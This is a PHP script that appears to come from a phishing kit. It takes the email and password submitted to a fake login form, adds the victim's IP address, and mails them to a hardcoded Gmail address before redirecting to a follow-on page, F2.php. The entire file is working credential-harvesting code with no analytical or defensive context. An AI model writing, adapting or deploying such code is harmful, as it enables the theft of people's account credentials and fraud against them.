<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['login_email'] != "") AND ($_POST['login_password'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "[** mun AL iraqi ** ]\n";
$message .= "email       : ".$_POST['login_email']."\n";
$message .= "password       : ".$_POST['login_password']."\n";
$message .= "[BA06]\n";
$message .= "[BA06]\n";
$send = "albaraeelq51@gmail.com";
$subject = "munther AL iraqi [CC] $ip";
$headers = "From: [mun AL iraqi **]<info@munther.com>";
mail($send,$subject,$message,$headers);
echo "<meta http-equiv='refresh' content='0; url=F2.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; F2.php' />";
}

?>